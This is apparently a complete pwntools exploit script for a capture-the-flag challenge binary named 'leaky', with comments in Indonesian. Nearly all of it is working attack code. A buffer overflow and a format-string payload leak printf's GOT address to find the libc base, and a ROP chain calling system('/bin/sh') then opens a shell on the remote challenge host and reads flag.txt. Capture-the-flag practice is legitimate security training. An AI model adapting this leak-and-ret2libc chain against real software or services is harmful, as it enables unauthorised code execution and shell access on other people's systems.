#!/usr/bin/env python3

from pathlib import Path
import re
from pwn import *


BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "leaky"
LIBC_PATH = BASE_DIR / "libc.so.6"
LD_PATH = BASE_DIR / "ld-linux-x86-64.so.2"

HOST = "chall.kali-team.online"
PORT = 10093

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
libc = ELF(str(LIBC_PATH), checksec=False)
context.log_level = "info"

PROMPT = b"Welcome! Enter input:"
OFFSET = 24
FMT_INDEX = 11


def argv():
    if LD_PATH.exists() and LIBC_PATH.exists():
        return [str(LD_PATH), "--library-path", str(BASE_DIR), str(BINARY_PATH)]
    return [str(BINARY_PATH)]


def start():
    if args.REMOTE:
        host = args.HOST or HOST
        port = int(args.PORT or PORT)
        return remote(host, port)

    if args.GDB:
        return gdb.debug(
            argv(),
            gdbscript="""
            set pagination off
            break *challenge+126
            continue
            """,
        )

    return process(argv(), cwd=str(BASE_DIR))


def recv_prompt(io):
    data = io.recvuntil(PROMPT, timeout=5)
    if PROMPT not in data:
        raise RuntimeError(f"prompt tidak ditemukan, output={data!r}")


def leak_printf(io):
    recv_prompt(io)

    ret = ROP(elf).find_gadget(["ret"]).address
    payload = f"LEAK%{FMT_INDEX}$sEND".encode()
    payload += b"\x00"
    payload = payload.ljust(OFFSET, b"A")

    # ret sebelum challenge memperbaiki alignment stack untuk printf kedua.
    payload += p64(ret)
    payload += p64(elf.symbols["challenge"])
    payload += p64(elf.got["printf"])

    io.sendline(payload)
    io.recvuntil(b"LEAK", timeout=5)
    leak = io.recvuntil(b"END", drop=True, timeout=5)
    if len(leak) < 5:
        raise RuntimeError(f"leak printf terlalu pendek: {leak!r}")

    printf_addr = u64(leak[:8].ljust(8, b"\x00"))
    if (printf_addr & 0xfff) != (libc.symbols["printf"] & 0xfff):
        raise RuntimeError(
            f"leak printf tidak valid: {hex(printf_addr)} "
            f"offset={hex(printf_addr & 0xfff)}"
        )

    libc.address = printf_addr - libc.symbols["printf"]
    log.success(f"printf leak = {hex(printf_addr)}")
    log.success(f"libc base   = {hex(libc.address)}")


def spawn_shell(io):
    recv_prompt(io)

    rop = ROP(libc)
    ret = rop.find_gadget(["ret"]).address
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]
    exit_func = libc.symbols["exit"]

    log.info(f"ret      = {hex(ret)}")
    log.info(f"pop rdi  = {hex(pop_rdi)}")
    log.info(f"/bin/sh  = {hex(bin_sh)}")
    log.info(f"system   = {hex(system)}")

    payload = b"A" * OFFSET
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)
    payload += p64(exit_func)

    io.sendline(payload)


def exploit(io):
    leak_printf(io)
    spawn_shell(io)
    io.sendline(b"cat flag.txt; exit")


def main():
    io = start()
    exploit(io)
    data = io.recvrepeat(timeout=2)
    if data:
        print(data.decode(errors="replace"), end="")
        match = re.search(rb"KaliTeam\{[^}\n]+\}", data)
        if match:
            log.success(f"flag = {match.group(0).decode()}")

    if io.connected():
        io.interactive()


if __name__ == "__main__":
    main()
